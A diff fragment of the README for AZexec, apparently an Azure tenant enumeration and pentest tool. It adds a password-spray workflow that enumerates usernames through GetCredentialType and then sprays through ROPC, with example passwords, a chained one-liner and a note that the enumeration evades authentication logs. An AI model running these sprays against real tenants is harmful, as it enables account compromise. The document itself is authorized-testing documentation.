 | Validate usernames | `.\azx.ps1 users -Domain target.com -CommonUsernames` | ❌ None | `nxc smb --users` |
+| **Enumerate user profiles** | `.\azx.ps1 user-profiles -ExportPath users.csv` | ✅ Guest/Member | `nxc smb --rid-brute` |
 | **Test null login** | `.\azx.ps1 guest -Domain target.com -Username user -Password ''` | ❌ None | **`nxc smb -u 'a' -p ''`** |
 | **Password spray** | `.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Pass123'` | ❌ None | `nxc smb -u users.txt -p 'Pass123'` |
+| **Username enum + spray** | See [Complete Password Spray Attack](#complete-password-spray-attack-workflow) | ❌ None | `nxc smb -u users.txt -p 'Pass123'` |
 | Enumerate devices | `.\azx.ps1 hosts` (login with guest creds) | ✅ Guest | `nxc smb --hosts` |
 | Enumerate groups | `.\azx.ps1 groups` | ✅ Guest/Member | `nxc smb --groups` |
 | Password policies | `.\azx.ps1 pass-pol` | ✅ Guest/Member | `nxc smb --pass-pol` |
 | Full device enum | `.\azx.ps1 hosts -ShowOwners -ExportPath out.json` | ✅ Guest/Member | - |
 | Test guest perms | `Get-MgUser -Top 10` (after connecting) | ✅ Guest | - |
-| Enumerate all users | `Get-MgUser -All \| Export-Csv users.csv` | ✅ Guest/Member | - |
+| Enumerate all users | `.\azx.ps1 user-profiles` | ✅ Guest/Member | - |
 
 ### Defensive Audit Commands
 
@@ -1624,6 +2220,57 @@ This tool is provided for **legitimate security testing, research, and administr
 | List all guests | `Get-MgUser -Filter "userType eq 'Guest'" \| ft DisplayName,UserPrincipalName` | Review and remove unnecessary guests |
 | Guest API activity | Check Azure AD Audit Logs → Filter by guest users and Microsoft Graph | Look for unusual enumeration patterns |
 | Guest sign-ins | Check Azure AD Sign-in Logs → Filter by guest users | Monitor for suspicious login locations/times |
+
+### Complete Password Spray Attack Workflow
+
+AZexec provides a two-phase approach to password spraying that mimics NetExec's workflow:
+
+**Phase 1: Username Enumeration (GetCredentialType API)**
+```powershell
+# Enumerate valid usernames using GetCredentialType API (no authentication required)
+.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv
+```
+
+**Phase 2: Password Spraying (ROPC Authentication)**
+```powershell
+# Extract just the valid usernames from CSV
+$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
+
+# Create a username file for spraying
+$validUsers | Out-File -FilePath validated-users.txt
+
+# Perform password spray with a single password
+.\azx.ps1 guest -Domain target.com -UserFile validated-users.txt -Password 'Summer2024!' -ExportPath spray-results.json
+```
+
+**One-Liner Workflow:**
+```powershell
+# Quick spray with common usernames
+.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid.csv; $validUsers = (Import-Csv valid.csv | Where-Object { $_.Exists -eq 'True' }).Username | Out-File temp-users.txt; .\azx.ps1 guest -Domain target.com -UserFile temp-users.txt -Password 'Winter2024!' -ExportPath spray.json; Remove-Item temp-users.txt
+```
+
+**Why Two Separate Commands?**
+
+The GetCredentialType API (used by `users` command) only validates username existence - it doesn't test passwords. This is by design:
+- **Phase 1 (`users`)**: Uses Microsoft's public GetCredentialType endpoint to check if usernames exist
+- **Phase 2 (`guest`)**: Uses ROPC (Resource Owner Password Credentials) OAuth2 flow to test actual authentication
+
+This separation provides several benefits:
+1. **Stealth**: Username enumeration doesn't trigger authentication logs
+2. **Efficiency**: Only spray against validated usernames (avoid account lockouts on non-existent users)
+3. **Flexibility**: Use different password lists or techniques between phases
+4. **Safety**: Validate targets before attempting authentication (reduces noise and lockout risk)
+
+**NetExec Equivalent:**
+```bash
+# Traditional NetExec workflow
+nxc smb 192.168.1.0/24 --users          # Enumerate users
+nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'  # Password spray
+
+# AZexec equivalent
+.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath users.csv
+.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
+```
 
 ---
 
